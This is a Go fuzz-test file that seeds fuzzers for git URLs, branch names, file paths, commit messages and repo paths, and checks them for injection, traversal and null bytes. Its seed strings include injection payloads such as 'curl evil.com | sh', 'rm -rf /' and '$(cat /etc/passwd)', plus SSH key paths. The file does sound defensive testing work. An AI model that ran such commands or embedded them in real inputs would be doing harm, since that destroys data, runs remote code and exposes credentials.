//go:build go1.18

package git

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/mrz1836/go-broadcast/internal/fuzz"
)

func FuzzGitURLSafety(f *testing.F) {
	// Add seed corpus - optimized to 15 high-value security test cases
	seeds := []string{
		// Valid URLs (3)
		"https://github.com/org/repo.git",
		"git@github.com:org/repo.git",
		"ssh://git@github.com/org/repo.git",

		// Command injection attempts (5)
		"https://github.com/org/repo.git; rm -rf /",
		"https://github.com/org/repo.git && curl evil.com | sh",
		"https://github.com/org/repo.git`whoami`",
		"https://github.com/org/repo.git$(cat /etc/passwd)",
		"git@github.com:org/repo.git; echo pwned",

		// Path traversal attempts (3)
		"file:///etc/passwd",
		"../../../etc/passwd",
		"https://github.com/../../../../etc/passwd",

		// Special characters (2)
		"https://github.com/org/repo\x00.git",
		"https://github.com/org/repo\n.git",

		// Edge cases (2)
		strings.Repeat("https://github.com/org/", 100) + "repo.git",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, url string) {
		// Skip long inputs to avoid expensive validation on unrealistic URLs
		if len(url) > 300 {
			t.Skipf("Input too large: %d bytes (limit: 300)", len(url))
		}

		// Create context with timeout to prevent expensive operations from hanging
		ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
		defer cancel()

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with URL: %v, input: %q", r, url)
			}
		}()

		// Check context before expensive validation
		select {
		case <-ctx.Done():
			t.Skipf("Context timeout before validation")
		default:
		}

		// Validate URL for security issues
		validateGitURL(t, url)

		// In real implementation, this would test against actual git client
		// Here we focus on validating the input patterns
	})
}

func FuzzGitFilePath(f *testing.F) {
	// Add seed corpus - optimized to 15 high-value security test cases
	seeds := []string{
		// Valid file paths (2)
		"README.md",
		"src/main.go",

		// Path traversal attempts (4)
		"../../../etc/passwd",
		"..\\..\\windows\\system32\\config",
		"~/.ssh/id_rsa",
		"$HOME/.bashrc",

		// Command injection attempts (4)
		"file;rm -rf /.txt",
		"file && curl evil.com | sh",
		"file`whoami`.txt",
		"file$(cat /etc/passwd).txt",

		// Special characters (3)
		"file\x00.txt",
		"file\n.txt",
		".git/config",

		// Edge cases (2)
		"",
		strings.Repeat("a/", 100) + "file.txt",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, filePath string) {
		// Skip long inputs to avoid expensive validation
		if len(filePath) > 500 {
			t.Skipf("Input too large: %d bytes (limit: 500)", len(filePath))
		}

		// Create context with timeout to prevent expensive operations from hanging
		ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
		defer cancel()

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with file path: %v, input: %q", r, filePath)
			}
		}()

		// Check context before expensive validation
		select {
		case <-ctx.Done():
			t.Skipf("Context timeout before validation")
		default:
		}

		// Validate file path for security issues
		validateGitFilePath(t, filePath)
	})
}

func FuzzGitBranchName(f *testing.F) {
	// Add seed corpus - optimized to 15 high-value security test cases
	seeds := []string{
		// Valid branch names (2)
		"master",
		"feature/test-123",

		// Command injection attempts (4)
		"main; rm -rf /",
		"feat`whoami`",
		"feat$(cat /etc/passwd)",
		"branch && curl evil.com | sh",

		// Git special characters (3)
		"branch~1",
		"branch:test",
		"branch..other",

		// Leading dashes - could be interpreted as flags (1)
		"-branch",

		// Path traversal in branch names (2)
		"../../../etc/passwd",
		"refs/../heads/main",

		// Special characters (2)
		"",
		"branch\x00null",

		// Edge cases (1)
		strings.Repeat("a", 255),
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, branch string) {
		// Skip extremely long inputs
		if len(branch) > 150 { // Conservative limit for fuzzing
			t.Skipf("Input too large: %d bytes (limit: 150)", len(branch))
		}

		// Create context with timeout to prevent expensive operations from hanging
		ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
		defer cancel()

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with branch name: %v, input: %q", r, branch)
			}
		}()

		// Check context before expensive validation
		select {
		case <-ctx.Done():
			t.Skipf("Context timeout before validation")
		default:
		}

		// Validate branch name for security issues
		validateGitBranchName(t, branch)
	})
}

func FuzzGitCommitMessage(f *testing.F) {
	// Add seed corpus - optimized to 12 high-value security test cases
	seeds := []string{
		// Normal commit messages (2)
		"Initial commit",
		"Fix bug in authentication",

		// Command injection attempts (3)
		"Fixed bug; rm -rf /",
		"Update`whoami`",
		"Fix $(cat /etc/passwd)",

		// Multi-line messages (2)
		"First line\nSecond line",
		"Title\n\nDetailed description",

		// Special characters (3)
		"Fix \"bug\" in 'code'",
		"Feature\x00null",
		"🎉 Initial commit",

		// Edge cases (2)
		"",
		strings.Repeat("a", 1000),
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, message string) {
		// Skip long inputs to avoid expensive validation
		if len(message) > 1000 {
			t.Skipf("Input too large: %d bytes (limit: 1000)", len(message))
		}

		// Create context with timeout to prevent expensive operations from hanging
		ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
		defer cancel()

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with commit message: %v, input: %q", r, message)
			}
		}()

		// Check context before expensive validation
		select {
		case <-ctx.Done():
			t.Skipf("Context timeout before validation")
		default:
		}

		// Validate commit message
		validateGitCommitMessage(t, message)
	})
}

func FuzzGitRepoPath(f *testing.F) {
	// Add seed corpus - optimized to 15 high-value security test cases
	seeds := []string{
		// Valid paths (3)
		"/tmp/repo",
		"./repo",
		"repo",

		// Path traversal attempts (4)
		"../../../etc/passwd",
		"/etc/passwd",
		"/root/.ssh",
		"~/.ssh/config",

		// Command injection attempts (3)
		"/tmp/repo; rm -rf /",
		"/tmp/repo && curl evil.com",
		"/tmp/repo`whoami`",

		// Paths with special characters (3)
		"/tmp/repo with spaces",
		"/tmp/repo\x00null",
		"/tmp/repo\n",

		// Edge cases (2)
		"",
		"C:\\repos\\test",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, repoPath string) {
		// Skip long inputs to avoid expensive validation
		if len(repoPath) > 500 {
			t.Skipf("Input too large: %d bytes (limit: 500)", len(repoPath))
		}

		// Create context with timeout to prevent expensive operations from hanging
		ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
		defer cancel()

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with repo path: %v, input: %q", r, repoPath)
			}
		}()

		// Check context before expensive validation
		select {
		case <-ctx.Done():
			t.Skipf("Context timeout before validation")
		default:
		}

		// Validate repo path for security issues
		validateGitRepoPath(t, repoPath)
	})
}

// Validation helper functions

func validateGitURL(t *testing.T, url string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(url) {
		t.Logf("Security: Shell metacharacters in git URL: %q", url)
	}

	// Check for path traversal in file URLs
	if strings.HasPrefix(strings.ToLower(url), "file://") {
		if fuzz.ContainsPathTraversal(url) {
			t.Logf("Security: Path traversal in file URL: %q", url)
		}
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(url) {
		t.Logf("Security: Null byte in URL: %q", url)
	}
}

func validateGitFilePath(t *testing.T, filePath string) {
	// Check for path traversal
	if fuzz.ContainsPathTraversal(filePath) {
		t.Logf("Security: Path traversal in file path: %q", filePath)
	}

	// Check for command injection (warning only for file paths)
	if fuzz.ContainsShellMetachars(filePath) {
		t.Logf("Security: Special characters in file path: %q", filePath)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(filePath) {
		t.Logf("Security: Null byte in file path: %q", filePath)
	}

	// Check if it starts with dash (could be interpreted as flag)
	if strings.HasPrefix(filePath, "-") && filePath != "-" && filePath != "." {
		t.Logf("Security: File path starts with dash: %q", filePath)
	}
}

func validateGitBranchName(t *testing.T, branch string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(branch) {
		t.Logf("Security: Shell metacharacters in branch name: %q", branch)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(branch) {
		t.Logf("Security: Null byte in branch name: %q", branch)
	}

	// Check if branch name starts with dash
	if strings.HasPrefix(branch, "-") {
		t.Logf("Security: Branch name starts with dash (could be interpreted as flag): %q", branch)
	}

	// Check for path traversal
	if strings.Contains(branch, "..") {
		t.Logf("Security: Potential path traversal in branch name: %q", branch)
	}
}

func validateGitCommitMessage(t *testing.T, message string) {
	// Git commit messages can legitimately contain special characters
	// Only check for null bytes which are problematic
	if fuzz.ContainsNullByte(message) {
		t.Logf("Security: Null byte in commit message: %q", message)
	}

	// Log if there are shell metacharacters (informational)
	if fuzz.ContainsShellMetachars(message) {
		t.Logf("Info: Special characters in commit message: %q", message)
	}
}

func validateGitRepoPath(t *testing.T, repoPath string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(repoPath) {
		t.Logf("Security: Shell metacharacters in repo path: %q", repoPath)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(repoPath) {
		t.Logf("Security: Null byte in repo path: %q", repoPath)
	}

	// Check for suspicious path patterns
	if strings.Contains(repoPath, "..") {
		t.Logf("Security: Potential path traversal in repo path: %q", repoPath)
	}

	// Check if path might escape intended directory
	suspiciousPaths := []string{"/etc", "/root", "/sys", "/proc"}
	for _, suspicious := range suspiciousPaths {
		if strings.HasPrefix(repoPath, suspicious) {
			t.Logf("Security: Suspicious system path: %q", repoPath)
		}
	}
}

// Test to verify validation logic
func TestGitCommandValidation(t *testing.T) {
	// This test verifies that our validation functions properly identify security patterns
	tests := []struct {
		name           string
		input          string
		checkFunc      func(*testing.T, string)
		expectSecurity bool // expect security issue to be logged
	}{
		{
			name:           "clean URL",
			input:          "https://github.com/org/repo.git",
			checkFunc:      validateGitURL,
			expectSecurity: false,
		},
		{
			name:           "URL with semicolon",
			input:          "https://github.com/org/repo.git; rm -rf /",
			checkFunc:      validateGitURL,
			expectSecurity: true,
		},
		{
			name:           "branch with dash",
			input:          "-branch",
			checkFunc:      validateGitBranchName,
			expectSecurity: true,
		},
		{
			name:           "path traversal",
			input:          "../../../etc/passwd",
			checkFunc:      validateGitFilePath,
			expectSecurity: true,
		},
		{
			name:           "clean branch",
			input:          "feature/test",
			checkFunc:      validateGitBranchName,
			expectSecurity: false,
		},
		{
			name:           "clean file path",
			input:          "README.md",
			checkFunc:      validateGitFilePath,
			expectSecurity: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Run validation and verify it doesn't panic
			tt.checkFunc(t, tt.input)
			// In real fuzzing, we would analyze logs for security patterns
		})
	}
}
